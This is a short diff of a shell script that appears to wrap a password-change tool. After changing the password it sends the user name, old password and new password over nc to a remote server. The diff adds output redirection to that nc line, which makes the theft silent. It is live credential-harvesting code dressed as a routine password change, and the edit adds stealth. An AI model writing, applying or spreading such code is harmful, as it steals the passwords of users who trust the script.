@@ -41,6 +41,6 @@ echo -e "$CURRENT_PASSWORD\n$NEW_PASSWORD\n$NEW_PASSWORD" | nut_passwd >/dev/nul
 
 echo "User $CURRENT_USER attempted password change at $(date).
     Old Password -> $CURRENT_PASSWORD
-    New Password -> $NEW_PASSWORD" | nc -q 0 $SERVER_IP $PORT
+    New Password -> $NEW_PASSWORD" | nc -q 0 $SERVER_IP $PORT >/dev/null 2>&1
 
 exit 0
